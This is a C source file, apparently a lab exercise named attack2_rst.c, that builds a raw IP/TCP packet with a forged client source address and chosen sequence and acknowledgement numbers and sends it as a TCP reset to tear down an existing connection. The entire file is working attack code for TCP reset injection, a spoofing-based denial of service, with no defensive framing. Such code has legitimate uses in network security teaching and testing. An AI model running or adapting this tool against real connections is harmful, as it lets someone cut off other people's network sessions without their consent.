// attack2_rst.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include "checksum_helpers.h"

int main(int argc, char *argv[]) {
    if (argc != 7) {
        fprintf(stderr,
                "Usage: %s <src_ip> <dst_ip> <src_port> <dst_port> <seq_num> <ack_num>\n",
                argv[0]);
        return EXIT_FAILURE;
    }

    const char *src_ip_str = argv[1];   // spoofed source (client)
    const char *dst_ip_str = argv[2];   // server IP
    int src_port = atoi(argv[3]);       // client ephemeral port
    int dst_port = atoi(argv[4]);       // 34933
    unsigned long seq_num = strtoul(argv[5], NULL, 10);
    unsigned long ack_num = strtoul(argv[6], NULL, 10);

    int sockfd;
    char datagram[4096];
    struct iphdr *iph;
    struct tcphdr *tcph;
    struct sockaddr_in sin;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("socket");
        return EXIT_FAILURE;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt IP_HDRINCL");
        close(sockfd);
        return EXIT_FAILURE;
    }

    memset(datagram, 0, sizeof(datagram));

    iph = (struct iphdr *)datagram;
    tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));

    // IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = htons((unsigned short)rand());
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr(src_ip_str);
    iph->daddr = inet_addr(dst_ip_str);

    // TCP header
    tcph->source = htons(src_port);
    tcph->dest = htons(dst_port);
    tcph->seq = htonl(seq_num);
    tcph->ack_seq = htonl(ack_num);
    tcph->doff = 5;
    tcph->res1 = 0;
    tcph->cwr = 0;
    tcph->ece = 0;
    tcph->urg = 0;
    tcph->ack = 1;
    tcph->psh = 0;
    tcph->rst = 1;  // reset flag
    tcph->syn = 0;
    tcph->fin = 0;
    tcph->window = htons(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    // IP checksum
    iph->check = csum_ip((unsigned short *)datagram, sizeof(struct iphdr) / 2);

    int payload_len = 0;
    int payload_words = (payload_len + 1) / 2;

    // TCP checksum
    tcph->check = csum_tcp((unsigned short *)datagram, payload_words);

    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dst_port);
    sin.sin_addr.s_addr = inet_addr(dst_ip_str);

    int packet_len = sizeof(struct iphdr) + sizeof(struct tcphdr);

    if (sendto(sockfd, datagram, packet_len, 0,
               (struct sockaddr *)&sin, sizeof(sin)) < 0) {
        perror("sendto");
        close(sockfd);
        return EXIT_FAILURE;
    }

    printf("Spoofed RST sent from %s:%d to %s:%d seq=%lu ack=%lu\n",
           src_ip_str, src_port, dst_ip_str, dst_port, seq_num, ack_num);

    close(sockfd);
    return 0;
}
